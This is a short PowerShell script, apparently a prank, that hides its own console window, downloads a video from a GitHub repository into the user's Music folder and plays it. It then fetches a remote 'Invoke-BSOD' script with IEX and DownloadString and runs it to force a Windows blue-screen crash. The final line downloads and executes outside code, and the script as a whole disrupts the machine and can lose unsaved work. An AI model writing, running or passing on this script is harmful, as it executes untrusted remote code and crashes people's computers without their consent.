# Function to minimize PowerShell window
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'
function Minimize-Window {
    $consolePtr = [Console.Window]::GetConsoleWindow()
    [Console.Window]::ShowWindow($consolePtr, 6) # Minimize
}

# Minimize PowerShell window
Minimize-Window

# Change directory to Music
Set-Location -Path $env:USERPROFILE\Music

# Download the video file
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/YeetTheAnson/vineboom/main/NiceComputer.mp4" -OutFile "NiceComputer.mp4"

# Play the video
$mediaPlayer = New-Object -ComObject WMPlayer.OCX
$mediaPlayer.URL = "NiceComputer.mp4"
$mediaPlayer.controls.play()

# Introduce delay to allow media player to start playing
Start-Sleep -Seconds 2

# Monitor video playback status
do {
    Start-Sleep -Seconds 1
} until ($mediaPlayer.playState -eq 0) # playState 0 represents stopped state

# Run the next part of the script after video playback
IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD
